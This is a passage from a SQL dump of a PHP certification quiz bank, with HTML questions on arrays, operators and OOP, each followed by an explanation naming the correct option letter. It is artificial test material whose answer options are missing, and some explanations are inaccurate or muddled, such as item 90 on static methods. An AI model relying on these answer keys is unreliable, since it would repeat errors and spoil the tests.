tabindex=\"-1\">http://in2.php.net/manual/en/language.functions.php</a></span></span></span></p>',0,'2012-11-18 22:54:53','2012-11-18 22:54:53'),
	(68,2,'What will be the output of the following .....a;\r\nprint($f + $e);\r\n?>','','<p><span>What will be the output of the following code snippet?</span></p>\r\n<p><span><pre><?php\r\n$a = 1;\r\n$b = 2;\r\n$c = 0xAF;\r\n$d = $b + $c;\r\n$e = $d * $b;\r\n$f = ($d + $e) % $a;\r\nprint($f + $e);\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The output of the above script will be 354. The step by step output of the code will be as follows:</span></p>\r\n<p><span><pre><?php\r\n$a = 1;\r\n$b = 2;\r\n$c = 0xAF; //The numeric value of $c will be 175.\r\n$d = $b + $c; //The value of $d will be 177.\r\n$e = $d * $b; //The value of $e will be 354.\r\n$f = ($d + $e) % $a; //The value of $f will be 0.\r\nprint($f + $e); // The printed output will be 354.\r\n?></pre></span></p>',0,'2012-11-18 22:55:56','2012-11-18 22:55:56'),
	(69,2,'Which of the following operators will you.....?\r\n','','<p><span>Which of the following operators will you use to check whether two variables contain the same instance of an object or not?</span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The \'===\' is used to check whether two variables contain the same instance of an object or not.</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>There are four types of equivalence operations in the PHP language:</span></span></p>\r\n<ul>\r\n<li><uc:hed>Equivalence Operation (==):&nbsp;</uc:hed>It evaluates to true if the two operands are equivalent, i.e., they can be converted to a common data type in which they have the same value but are not necessarily of the same type.</li>\r\n<li><uc:hed>Identity Operation (===):&nbsp;</uc:hed>It evaluates to true only if the operands are of the same data type and have the same value.</li>\r\n<li><uc:hed>Not-equivalent Operation (!=):&nbsp;</uc:hed>It evaluates to true if the two operands are not equivalent, without regards to their data type.</li>\r\n<li><uc:hed>Not-identical Operation (!==):&nbsp;</uc:hed>It evaluates to true if the two operands are not of the same data type or do not have the same value.</li>\r\n</ul>\r\n<div>\r\n<div class=\"clearfix\"><br class=\"Apple-interchange-newline\" />Answer option D is incorrect. It is a concatenation operator that is used to concatenate strings.</div>\r\n<div class=\"clearfix\"><b>Chapter:</b>&nbsp;Functions and Arrays</div>\r\n</div>\r\n<p><span><br /></span></p>',0,'2012-11-18 22:56:56','2012-11-18 22:56:56'),
	(70,2,'You are running the following PHP script:.....at will be the output?','','<p><span>You are running the following PHP script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n$queue = array(1, 2);\r\narray_unshift($queue, 0, 4);\r\nprint_r($queue);\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_unshift() function is used to add one or more elements to the starting of an array. This function modifies all numerical array keys to start counting from zero, while it does not touch the literal keys.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-unshift.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-unshift.php</a></uc:ref></p>',0,'2012-11-18 22:58:07','2012-11-18 22:58:07'),
	(71,2,'Which of the following functions can be u.....ists in a given array or not?','','<p><span>Which of the following functions can be used to check whether a particular element exists in a given array or not?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The in_array() php function is used to check whether a particular element exists in a given array or not.</span><br /><br /><span>Answer option A is incorrect. The array_key_exists() php function is used to check whether an index key exists in a given array or not.</span><br /><br /><span>Answer option C is incorrect. The array_keys() function returns an array of all array indices.</span><br /><br /><span>Answer option D is incorrect. The array_value() function returns an array in all array values.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.in-array.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.in-array.php</a></uc:ref></p>',0,'2012-11-18 22:58:55','2012-11-18 22:58:55'),
	(72,2,'You have given the following PHP code:','','<p><span>You have given the following PHP code:</span></p>\r\n<p><span><pre><?php\r\nclass Example {\r\n    public $public = \'1\';\r\n    private $prv   = \'2\';\r\n    protected $prt = \'3\';\r\n}\r\n \r\n$arrayobj = new ArrayObject(new Example());\r\nvar_dump($arrayobj->count());\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The ArrayObject::count() method is used to get the number of public properties in ArrayObject. Since in this example, there is only one public property, the ArrayObject::count() method will count only one property.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/arrayobject.count.php\" tabindex=\"-1\">http://in2.php.net/manual/en/arrayobject.count.php</a></uc:ref></p>',0,'2012-11-18 23:00:03','2012-11-18 23:00:03'),
	(73,2,'What will be the output of the given PHP .....$key = $val\\n\";\r\n}\r\n ?>','','<p><span>What will be the output of the given PHP code?</span></p>\r\n<p><span><pre><?php\r\n$name = array(\"d\" => \"Mark\", \"a\" => \"David\", \"b\" => \"Peter\", \"c\" => \"Martha\");\r\n$nameArrayObject = new ArrayObject($name);\r\n$nameArrayObject->ksort();\r\n \r\nforeach ($nameArrayObject as $key => $val) {\r\n    echo \"$key = $val\\n\";\r\n}\r\n ?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The ArrayObject::ksort() function accepts an associative array and sorts its keys alphabetically if any strings are present, or numerically if all elements are numbers. However, it does not sort the elements of the associative array.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/arrayobject.ksort.php\" tabindex=\"-1\">http://in2.php.net/manual/en/arrayobject.ksort.php</a></uc:ref></p>',0,'2012-11-18 23:01:02','2012-11-18 23:01:02'),
	(74,2,'You have been given the following PHP scr.....ss=\"typ\">','','<p><span>You have been given the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$a = \'somevalue\'; \r\n$array = array(\"a\" => \"One\",\"b\" => \"Two\", \"c\" => \"Three\");\r\n????????????? \r\necho \"\\$a = $a; \\$b = $b; \\$c = $c\";?> </pre></span></p>\r\n<p><span><span>What should you write at line number 4 to get the following output?</span></span></p>\r\n<p><span><span><br /></span></span></p>\r\n<p><span><span><span class=\"pln\">$a </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">One</span><span class=\"pun\">;</span><span class=\"pln\"> $b </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">Two</span><span class=\"pun\">;</span><span class=\"pln\"> $c </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">Three</span></span></span></p>\r\n<p><span><span><span class=\"typ\"><br /></span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>You should use the extract() function to get the desired output. The extract() function is used to import variables into the local symbol table from an array. It uses array index keys as variable names and index values as the values of these variables. On the successful execution, the extract() function returns the number of variables extracted.</span><br /><br /><span>Answer option B is incorrect. The implode() function traverses the elements of an array and recreates a single string using an argument. The syntax of the implode() function is as follows:</span></p>\r\n<p><span><span class=\"pln\"> implode</span><span class=\"pun\">(</span><span class=\"pln\">separator</span><span class=\"pun\">,</span><span class=\"pln\">array</span><span class=\"pun\">)</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>where the separator specifies what to put between the array elements, and array parameter is the array to join to a string.</span><br /><br /><span>Answer option C is incorrect. The ksort() function accepts an associative array and sorts its keys either alphabetically if any strings are present, or numerically if all elements are numbers. However, it does not sort the elements of the associative array.</span><br /><br /><span>Answer option D is incorrect. The asort() function accepts an associative array and sorts its values either alphabetically if any strings are present or numerically if all elements are numbers. However, the asort() function preserves the array keys. Consider the following example:</span></span></span></p>\r\n<p><pre><?php\r\n    $array = array(\"a1\"=>\'x\',\"a2\"=>\'e\',\"a3\"=>\'z\');\r\n    asort( $array );\r\n    foreach ( $array as $keys => $values )\r\n    {\r\n         print \"$keys = $values<br />\";\r\n    }\r\n?></pre></p>\r\n<p><span><span class=\"pun\"><span><span>Output:</span></span></span></span></p>\r\n<pre>a2 = e<br />a1 = x<br />a3 = z</pre>\r\n<pre></pre>\r\n<pre><span>In the output, the array keys are preserved and array elements are sorted in the same way as in the sort() function.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.extract.php\" tabindex=\"-1\">http://php.net/manual/en/function.extract.php</a></uc:ref></pre>\r\n<p><span><span class=\"pun\"><span><span><br /></span></span></span></span></p>\r\n<div><span class=\"pun\" style=\"color: #93a1a1; font-family: Monaco, Menlo, Consolas, \'Courier New\', monospace; font-size: 13px; line-height: 20px; white-space: pre-wrap; background-color: #f7f7f9;\"><br /></span></div>',0,'2012-11-18 23:03:33','2012-11-18 23:03:33'),
	(75,2,'What will be the output of the following ....._element ($array);?> ','','<p><span>What will be the output of the following PHP script?</span></p>\r\n<p><pre><?php\r\n$array = array(\'a\' => \'One\', \'b\' => \'Two\', \'c\' =>\r\narray(\'d\' => \'Three\', \'e\' => \'Four\'));\r\n    function print_element($array)\r\n {\r\n    extract($array);\r\n    return $c[\'e\'];\r\n }\r\n print print_element ($array);\r\n?></pre></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The extract() function is used to import variables into the local symbol table from an array. It uses array index keys as variable names and index values as the values of these variables. On the successful execution, the extract() function returns the number of variables extracted. Hence, in this example, index keys a, b, c, d will be used as a variable and the index values will be the value of those variables. Therefore, the value of $c[\'e\'] will be \'Four\'.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.extract.php\" tabindex=\"-1\">http://php.net/manual/en/function.extract.php</a></uc:ref></p>',0,'2012-11-18 23:04:25','2012-11-18 23:06:04'),
	(76,2,'What will be the output of the following .....3,6),array(4,5,6));\r\n?>','','<p><span>What will be the output of the following PHP code?</span></p>\r\n<p><span><pre><?php\r\narray_combine(array(1,2,3,6),array(4,5,6));\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The array_combine() function is used to combine two arrays. It uses the first array as a key and the second array as a value. For example,</span><br /><br /><span>You want to run the following PHP code:</span></p>\r\n<p><span><span class=\"pln\">array_combine</span><span class=\"pun\">(</span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">1</span><span class=\"pun\">,</span><span class=\"lit\">2</span><span class=\"pun\">,</span><span class=\"lit\">3</span><span class=\"pun\">,</span><span class=\"lit\">6</span><span class=\"pun\">),</span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">4</span><span class=\"pun\">,</span><span class=\"lit\">5</span><span class=\"pun\">,</span><span class=\"lit\">6</span><span class=\"pun\">));</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>Here, the php_combine() function creates an array by using one array for keys and another for its values and gives the following array as the output:</span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">1</span><span class=\"pun\">=&gt;</span><span class=\"lit\">4</span><span class=\"pun\">,</span><span class=\"lit\">2</span><span class=\"pun\">=&gt;</span><span class=\"lit\">5</span><span class=\"pun\">,</span><span class=\"lit\">3</span><span class=\"pun\">=&gt;</span><span class=\"lit\">6</span><span class=\"pun\">)</span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pun\"><br /></span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pun\"><uc:kwd>Note: Both parameters of the array_combine() function should have an equal number of elements, otherwise it will produce a warning message.</uc:kwd><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-combine.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-combine.php</a></uc:ref></span></span></span></span></p>',0,'2012-11-18 23:07:37','2012-11-18 23:07:37'),
	(77,2,'You have been given the date format \"yyyy.....cute to accomplish this task?','','<p><span>You have been given the date format \"yyyy-mm-dd\". You want to put values in the $year, $month, and $day variables. Which of the following PHP code snippets will you execute to accomplish this task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The sscanf() function is used to parse an input from a string according to the format. It reads from the string and interprets it according to the specified format.</span><br /><br /><span>Answer option B is incorrect. scanf() is not a standard library function.</span><br /><br /><span>Answer options C and D are incorrect. sprintf() and printf() functions are not used for getting inputs. Both these PHP code snippets will produce error messages.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.sscanf.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.sscanf.php</a></uc:ref></p>',0,'2012-11-18 23:08:19','2012-11-18 23:08:19'),
	(78,2,'Which of the following functions is used .....?\r\n','','<p><span>Which of the following functions is used to insert a new element in the beginning of an array?</span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The array_unshift() function is used to insert a new element in the beginning of an array. The return value of the array_unshift() is the new number of elements in the array. The syntax of the array_unshift() function is as follows:</span></p>\r\n<p><span><span class=\"pln\"> array_unshift</span><span class=\"pun\">(</span><span class=\"pln\">array</span><span class=\"pun\">,</span><span class=\"pln\">value1</span><span class=\"pun\">,</span><span class=\"pln\">value2</span><span class=\"pun\">,</span><span class=\"pln\">value3</span><span class=\"pun\">...)</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>Answer option B is incorrect. The array_pop() function deletes the last element of an array.</span><br /><br /><span>Answer option A is incorrect. The array_push() function inserts one or more elements to the end of an array.</span><br /><br /><span>Answer option D is incorrect. The array_unique() function removes the duplicate values from the given array.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-unique.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-unique.php</a></uc:ref></span></span></p>',0,'2012-11-18 23:09:23','2012-11-18 23:09:23'),
	(79,2,'What will be the output of the PHP script.....\nprint_r($array4);\r\n?> ','','<p><span>What will be the output of the PHP script given below?</span></p>\r\n<p><span><pre><?php\r\n$array1 = array(\"orange\", \"banana\", \"apple\", \"raspberry\");\r\n$array2 = array(0 => \"pineapple\", 4 => \"cherry\");\r\n$array3 = array(0 => \"grape\");\r\n$array4 = array_replace($array1, $array2, $array3);\r\nprint_r($array4);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_replace() function is used to replace elements from passed arrays into one array. While using the array_replace() function, if an array contains a key that is already present in another array, the value of the key gets replaced from the value in the second array. If the key is present only in the second array and not in the first one, it gets added to the first array with the same value in the second array. If the key is present only in the first array, there is no change. Hence, in the above script, the output will be as follows:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n\r\nArray\r\n(\r\n    [0] => grape\r\n    [1] => banana\r\n    [2] => apple\r\n    [3] => raspberry\r\n    [4] => cherry\r\n)\r\n\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-replace.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-replace.php</a></span></p>',0,'2012-11-18 23:11:36','2012-11-18 23:11:36'),
	(80,2,'Which of the following functions returns .....put lowercased or uppercased?','','<p><span>Which of the following functions returns an array with all keys from input lowercased or uppercased?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_change_key_case method returns an array with all keys from input lowercased or uppercased.</span><br /><br /><span>Answer option B is incorrect. The array_ chunk method chunks an array into size large chunks.</span><br /><br /><span>Answer option C is incorrect. The array_ combine() method creates an array by using the values from the keys array as keys and the values from the values array as the corresponding values.</span><br /><br /><span>Answer option D is incorrect. The array_count_values method returns an array using the values of the input array as keys and their frequency in input as values.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://au2.php.net/manual/en/function.array-change-key-case.php\" tabindex=\"-1\">http://au2.php.net/manual/en/function.array-change-key-case.php</a></uc:ref></p>',0,'2012-11-18 23:12:19','2012-11-18 23:12:19'),
	(81,2,'Which of the following methods compares a.....2 and returns the difference?','','<p><span>Which of the following methods compares array1 against array2 and returns the difference?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_diff_assoc() method compares array1 against array2 and returns the difference.</span><br /><br /><span>Answer option B is incorrect. The array_diff_key() method compares the keys from array1 against the keys from array2 and returns the difference.</span><br /><br /><span>Answer option C is incorrect. The array_diff_uassoc method compares array1 against array2 and returns the difference.</span><br /><br /><span>Answer option D is incorrect. The array_diff_ukey method compares the keys from array1 against the keys from array2 and returns the difference.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://au2.php.net/manual/en/function.array-diff-assoc.php\" tabindex=\"-1\">http://au2.php.net/manual/en/function.array-diff-assoc.php</a></uc:ref></p>',0,'2012-11-18 23:13:07','2012-11-18 23:13:07'),
	(82,2,'Which of the following methods fills an a.....es of the keys array as keys?','','<p><span>Which of the following methods fills an array with the value of the value parameter, using the values of the keys array as keys?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_fill_keys() method fills an array with the value of the value parameter, using the values of the keys array as keys.</span><br /><br /><span>Answer option B is incorrect. The array_fill() method fills an array with num entries of the value of the value parameter, keys starting at the start_index parameter.</span><br /><br /><span>Answer option C is incorrect. The array_filter() method iterates over each value in the input array passing them to the callback function.</span><br /><br /><span>Answer option D is incorrect. The array_flip() returns an array in flip order, i.e. keys from trans become values and values from trans become keys.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://au2.php.net/manual/en/function.array-filter.php\" tabindex=\"-1\">http://au2.php.net/manual/en/function.array-filter.php</a></uc:ref></p>',0,'2012-11-18 23:13:59','2012-11-18 23:13:59'),
	(83,2,'Which of the following methods returns an.....present in all the arguments?','','<p><span>Which of the following methods returns an array containing all the values of array1 that are present in all the arguments?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_intersect_assoc() method returns an array containing all the values of array1 that are present in all the arguments.</span><br /><br /><span>Answer option B is incorrect. The array_intersect_key() method returns an array containing all the entries of array1 which have keys that are present in all the arguments.</span><br /><br /><span>Answer option C is incorrect. The array_keys method returns all the keys or a subset of the keys of an array.</span><br /><br /><span>Answer option D is incorrect. The array_intersect_ukey() method returns an array containing all the values of array1 which have matching keys that are present in all the arguments.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://au2.php.net/manual/en/function.array-intersect-assoc.php\" tabindex=\"-1\">http://au2.php.net/manual/en/function.array-intersect-assoc.php</a></uc:ref></p>',0,'2012-11-18 23:14:52','2012-11-18 23:14:52'),
	(84,2,'Which of the following functions returns .....present in all the arguments?','','<p><span>Which of the following functions returns an array containing all the values of array1 that are present in all the arguments?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_intersect() function returns array containing all the values of array1 whose values are present in all the arguments.</span><br /><br /><span>Answer option B is incorrect. The array_key_exists() function is used to check if the given key or index exists in the array.</span><br /><br /><span>Answer option C is incorrect. The array_keys() function is used to return all the keys or a subset of the keys of an array.</span><br /><br /><span>Answer option D is incorrect. The array_map function is used to apply the callback to the elements of the given arrays.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://au2.php.net/manual/en/function.array-intersect.php\" tabindex=\"-1\">http://au2.php.net/manual/en/function.array-intersect.php</a></uc:ref></p>',0,'2012-11-18 23:15:44','2012-11-18 23:15:44'),
	(85,2,'Which of the following functions will you..... to merge one or more arrays?','','<p><span>Which of the following functions will you use to merge one or more arrays?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The function array_merge() is used to merge one or more arrays. The syntax of the function array_merge() is as follows:</span></p>\r\n<p><span><span class=\"pln\">array array_merge </span><span class=\"pun\">(</span><span class=\"pln\"> array $array1 </span><span class=\"pun\">[,</span><span class=\"pln\"> array $</span><span class=\"pun\">...</span><span class=\"pln\"> </span><span class=\"pun\">]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>Answer option B is incorrect. The array_pad() function is used to pad array to the specified length with a value.</span><br /><br /><span>Answer option C is incorrect. The array_pop() function is used to pop the element off the end of array.</span><br /><br /><span>Answer option D is incorrect. The array_product() function is used to calculate the product of the array elements.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://au2.php.net/manual/en/function.array-merge.php\" tabindex=\"-1\">http://au2.php.net/manual/en/function.array-merge.php</a></uc:ref></span></span></p>',0,'2012-11-18 23:16:58','2012-11-18 23:16:58'),
	(86,3,'Consider the following PHP code snippet:','','<p><span>Consider the following PHP code snippet:</span></p>\r\n<p><span><pre><?php\r\nclass Object {\r\n   function Object( $entity ) {\r\n       $entity->name=\"John\";\r\n   }\r\n}\r\nclass Entity {\r\n     var $name = \"Maria\";\r\n}\r\n$entity = new Entity();\r\n$obj = new Object( $entity );\r\nprint $entity->name;\r\n?> </pre></span></p>\r\n<p><span><span>What should be the output of this script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the script used in the question, the Object class has a constructor that accepts an Entity object, which changes the $name property of the Entity object. Since PHP 5 passes and assigns objects by reference instead of value, there would be only one Entity object in the script, and different handles would refer to it. Therefore, when you run the PHP script, it will give the output \"John\".</span><br /><br /><span>Answer option B is incorrect. The PHP script would have returned Maria as the output if you were running this script in PHP 4 environment. Since, in PHP 4, a copy of an Entity object is passed to the Object constructor, the original object will not be affected by the change, and the script would output \"Maria\", the default $name value for Entity objects. Since this exam is based on PHP 5.3, this is not a correct answer option.</span><br /><br /><span>Answer option C is incorrect. The script will not return this output.</span><br /><br /><span>Answer option D is incorrect. The script will run successfully and will not return any error message.</span></p>',0,'2012-11-23 21:18:48','2012-11-23 21:18:48'),
	(87,3,'Which of the following options shows the .....les using the $this variable?','','<p><span>Which of the following options shows the correct format of fetching class variables using the $this variable?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The $this variable refers to the properties of the same class. It cannot be used outside of a class. The $this variable is used to access variables inside the same class. The format for using the $this variable is as follows:</span></p>\r\n<p><span><pre>$this->varname</pre></span></p>\r\n<p><span><span>where, varname is a variable inside the class.</span><br /><br /><span>Answer options A, C, and D are incorrect. These are not valid formats of using the $this operator.</span></span></p>',0,'2012-11-23 21:23:11','2012-11-23 21:23:11'),
	(88,3,'Which of the following access controls sp.....?\r\n','','<p><span>Which of the following access controls specifies that a feature can be accessed by any other class?</span></p>\r\n<p><span><br /></span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option A is correct.<br /><br />Access control modifiers/access specifiers are PHP keywords that affect the behavior of the class or function it precedes. PHP has a number of modifiers, which are listed in the following table:\r\n<table border=\"1\">\r\n<tbody>\r\n<tr><th>Keyword</th><th>Description</th></tr>\r\n<tr>\r\n<td>final</td>\r\n<td>It defines a constant feature. This variable or function cannot be overridden in an inherited class.</td>\r\n</tr>\r\n<tr>\r\n<td>private</td>\r\n<td>It specifies that a feature can be accessed only by code in the same class.</td>\r\n</tr>\r\n<tr>\r\n<td>protected</td>\r\n<td>It specifies that a feature can be accessed only by code in a subclasses of the class where it is defined.</td>\r\n</tr>\r\n<tr>\r\n<td>public</td>\r\n<td>It specifies that a feature can be accessed by any other class.</td>\r\n</tr>\r\n<tr>\r\n<td>abstract</td>\r\n<td>It cannot be used directly. Hence, a user must have to inherit abstract function or method first.<br /><br /></td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</div>',0,'2012-11-23 21:24:31','2012-11-23 21:24:31'),
	(89,3,'Which of the following methods is called .....defined attribute of a class?','','<p><span>Which of the following methods is called when a user sets a value of an undeclared or undefined attribute of a class?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The __set() method is called when a user sets a value of an undeclared or undefined attribute of a class. Using this method, the programmer can keep track on variables that are not defined inside the class.</span></p>',0,'2012-11-23 21:26:17','2012-11-23 21:26:17'),
	(90,3,'What is the primary difference between a .....s static and a normal method?','','<p><span>What is the primary difference between a method declared as static and a normal method?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>An instantiated class object cannot access property or method that is declared as static. A method will be treated as public if visibility is not mentioned, because static methods are called without an instance of the object.The pseudo-variable $this is not available inside the method declared as static. So the correct answer is B.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/language.oop5.static.php\" tabindex=\"-1\">http://in3.php.net/manual/en/language.oop5.static.php</a></uc:ref></p>',0,'2012-11-23 21:27:01','2012-11-23 21:27:01'),
	(91,3,'What will be the result of comparing the .....ar_dump($x == $y);\r\n?> ','','<p><span>What will be the result of comparing the following two PHP arrays?</span></p>\r\n<p><span><pre><?php\r\n    $x = array(10,2,4);\r\n    $y = array(1 => 2, 0 => 10, 2 => 4);\r\n    var_dump($x == $y);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Since both the arrays contain same values, the var_dump($x == $y) syntax will return bool(true). The var_dump() function is used to display structured information about one or more expressions that includes its type and value. For example, a user runs the following script:</span></p>\r\n<p><span><pre><?php\r\n    $array1 = array (\'a\' => 20, 30, 35);\r\n    $array2 = array (\'b\' => 20, 35, 30);\r\n    $array = array_intersect_assoc ($array1, $array2);\r\n    var_dump ($array);\r\n?> </pre></span></p>\r\n<p><span><span>The output will be as follows:</span><br /><uc:stx>array(0) { }&nbsp;<br /><br /><uc:ref>Reference: PHP Manual, Contents: \"var_dump\"</uc:ref></uc:stx></span></p>',0,'2012-11-23 21:28:14','2012-11-23 21:28:14'),
	(92,3,'Which of the following statements is/are .....egarding closures in PHP 5.3?','','<p><span>Which of the following statements is/are FALSE regarding closures in PHP 5.3?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>Closures allows the creation of functions which have no specified name. Closures may also inherit variables from the parent scope. The parent scope of a closure is the function in which the closure was declared (not necessarily the function it was called from). It is possible to use func_num_args(), func_get_arg(), and func_get_args() from within a closure.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/functions.anonymous.php\" tabindex=\"-1\">http://in3.php.net/manual/en/functions.anonymous.php</a></uc:ref></p>',0,'2012-11-23 21:28:58','2012-11-23 21:28:58'),
	(93,3,'Which of the following functions will sor..... preserving key associations?','','<p><span>Which of the following functions will sort an array in ascending order by value, while preserving key associations?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>sort() will sort the array in ascending order but will lose the key associations. However asort() sorts an array ascending order by value, while preserving key associations.</span><br /><br /><span>Answer option B is incorrect. usort() will sort an array by its values using a user-supplied comparison function, but lose keys associations.</span><br /><br /><span>Answer option C and D are incorrect. ksort() and krsort() will sort the array by keys, not values in ascending and descending order respectively.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.asort.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.asort.php</a></uc:ref></p>',0,'2012-11-23 21:30:21','2012-11-23 21:30:21'),
	(94,3,'What is the output of this code snippet?  ','','<p><span>What is the output of this code snippet?</span></p>\r\n<p><span><pre><?php\r\n  $a = array(0.001 => \'b\', .1 => \'c\');\r\n  print_r($a);\r\n?>  </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>Array keys cannot have float values. So 0.001 becomes 0, and then for the next key .1, it also turns to 0 which overwrites the first key value, and assigns 0 =&gt; \'c\'.</span><br /><br /><uc:ref>Reference: PHP Manual, \"Associative Arrays\"</uc:ref></p>',0,'2012-11-23 21:31:23','2012-11-23 21:31:23'),
	(95,3,'Which of the following statements is/are ....._array() function in PHP 5.3?','','<p><span>Which of the following statements is/are FALSE regarding forward_static_call_array() function in PHP 5.3?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The forward_static_call_array() function is used to call a static method and pass the arguments as array. This function must be called within a method context, it can\'t be used outside a class. This function must be called within a method context. It uses late static binding. All arguments of the forwarded method are passed as values, and as an array. The syntax of the forward_static_call_array() function is as follows:</span></p>\r\n<p><span><pre> mixed forward_static_call_array ( callable $function , array $parameters ) \r\n</pre></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://php.net/manual/en/function.forward-static-call-array.php\" tabindex=\"-1\">http://php.net/manual/en/function.forward-static-call-array.php</a></span></p>',0,'2012-11-23 21:32:39','2012-11-23 21:32:39'),
